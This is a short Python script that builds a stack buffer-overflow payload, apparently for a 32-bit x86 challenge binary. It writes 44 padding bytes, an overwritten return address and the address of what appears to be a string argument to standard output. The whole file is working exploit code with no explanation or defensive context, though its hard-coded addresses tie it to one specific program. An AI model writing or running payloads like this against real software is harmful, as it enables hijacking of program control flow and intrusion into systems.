import sys

pad=b'a'*44
ret1=b'\x1a\x86\x04\x08'
str1=b'\x30\xa0\x04\x08'
sc = pad + ret1 + str1


sys.stdout.buffer.write(sc)
